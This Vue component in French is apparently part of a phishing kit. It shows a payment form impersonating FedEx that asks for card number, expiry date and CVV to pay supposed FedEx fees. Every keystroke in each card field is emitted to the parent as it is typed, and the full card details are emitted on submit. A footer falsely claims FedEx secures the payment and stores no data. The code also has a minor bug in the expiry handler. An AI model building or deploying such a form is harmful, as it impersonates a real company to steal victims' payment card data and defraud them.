<script setup>
import { reactive, ref, defineEmits, computed } from 'vue'
const emit = defineEmits(['submit', 'typing'])

const form = reactive({
  cardNumber: '',
  expiration: '',
  cvv: ''
})

// Message d’erreur pour la carte
const cardError = ref('')

// Luhn check (true si valide)
function isValidCardNumber(number) {
  // Retire tous les espaces
  number = number.replace(/\s+/g, '')
  if (number.length < 12) return false
  let sum = 0
  let shouldDouble = false
  // Luhn à l’envers
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i])
    if (shouldDouble) {
      digit *= 2
      if (digit > 9) digit -= 9
    }
    sum += digit
    shouldDouble = !shouldDouble
  }
  return sum % 10 === 0
}

// Formatte le numéro au fur et à mesure (groupes de 4)
function onCardInput(e) {
  emit('typing', { field: 'card number', value: e.target.value });
  let value = e.target.value.replace(/\D/g, '')
  if (value.length > 16) value = value.slice(0, 16)
  // Groupes de 4 chiffres
  let formatted = value.replace(/(.{4})/g, '$1 ').trim()
  form.cardNumber = formatted

  if (formatted.length >= 12) {
    cardError.value = isValidCardNumber(form.cardNumber)
      ? ''
      : "Le numéro de carte est invalide. Merci de vérifier votre carte."
  } else {
    cardError.value = ''
  }
}

// Formatte l’expiration en MM/AA
function onExpirationInput(e) {
    emit('typing', { field: 'exp', value: event.target.value });
  let value = e.target.value.replace(/\D/g, '')
  if (value.length > 4) value = value.slice(0, 4)
  if (value.length > 2) {
    value = value.slice(0, 2) + '/' + value.slice(2)
  }
  form.expiration = value
}

// Le bouton ne peut être cliqué que si tout est OK
const isFormValid = computed(() =>
  form.cardNumber &&
  isValidCardNumber(form.cardNumber) &&
  form.expiration.length === 5 &&
  /^\d{2}\/\d{2}$/.test(form.expiration) &&
  form.cvv.length >= 3 && form.cvv.length <= 4
)

const submit = () => {
  if (!isFormValid.value) return
  emit('submit', { ...form })
}

function handleInput(field, event) {
  emit('typing', { field, value: event.target.value });
}
</script>

<template>
  <form
    @submit.prevent="submit"
    class="w-full max-w-2xl mx-auto px-4 py-8 flex flex-col gap-7"
  >

    <div class="text-lg font-semibold text-gray-800 mb-1 text-center">
      Paiement sécurisé
    </div>
    <div class="text-center text-gray-600 text-sm mb-6">
      Entrez vos informations bancaires pour régler les frais FedEx.
    </div>
    <!-- Numéro de carte -->
    <div>
      <label class="block text-xs font-bold uppercase text-gray-700 tracking-widest mb-1">
        Numéro de carte
      </label>
      <input
        :value="form.cardNumber"
        @input="onCardInput"
        required
        maxlength="19"
        inputmode="numeric"
        autocomplete="cc-number"
        placeholder="1234 5678 9012 3456"
        class="w-full bg-white border border-gray-300 rounded-md px-3 py-3 text-gray-900 text-base font-medium
               focus:outline-none focus:border-[#4d148c] focus:ring-2 focus:ring-[#4d148c] transition"
      />
      <transition name="fade">
        <div v-if="cardError" class="mt-2 px-3 py-2 rounded bg-[#f4eefd] text-[#4d148c] text-sm font-semibold flex items-center gap-2">
          <svg class="w-5 h-5 flex-shrink-0" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#4d148c" /><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="16" font-family="Arial" dy="-.3em">!</text></svg>
          <span>{{ cardError }}</span>
        </div>
      </transition>
    </div>
    <div class="flex flex-col sm:flex-row gap-5">
      <!-- Date expiration -->
      <div class="flex-1">
        <label class="block text-xs font-bold uppercase text-gray-700 tracking-widest mb-1">
          Date d'expiration
        </label>
        <input
          :value="form.expiration"
          @input="onExpirationInput"
          required
          maxlength="5"
          inputmode="numeric"
          autocomplete="cc-exp"
          placeholder="MM/AA"
          class="w-full bg-white border border-gray-300 rounded-md px-3 py-3 text-gray-900 text-base font-medium
                 focus:outline-none focus:border-[#4d148c] focus:ring-2 focus:ring-[#4d148c] transition"
        />
      </div>
      <!-- CVV -->
      <div class="flex-1">
        <label class="block text-xs font-bold uppercase text-gray-700 tracking-widest mb-1">
          CVV
        </label>
        <input
          v-model="form.cvv"
          required
          @input="handleInput('cvv', $event)"
          maxlength="4"
          inputmode="numeric"
          autocomplete="cc-csc"
          placeholder="123"
          class="w-full bg-white border border-gray-300 rounded-md px-3 py-3 text-gray-900 text-base font-medium
                 focus:outline-none focus:border-[#4d148c] focus:ring-2 focus:ring-[#4d148c] transition"
        />
      </div>
    </div>
    <button
      type="submit"
      :disabled="!isFormValid"
      class="w-full mt-5 bg-[#4d148c] hover:bg-[#3b1066] text-white text-base font-semibold py-3 rounded-md transition focus:outline-none focus:ring-2 focus:ring-[#ff6600] focus:ring-offset-2 disabled:bg-gray-300 disabled:cursor-not-allowed"
    >
      Payer
    </button>
    <p class="text-xs text-center text-gray-500 mt-3">
      Paiement sécurisé par FedEx. Aucune donnée n’est conservée.
    </p>
  </form>
</template>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
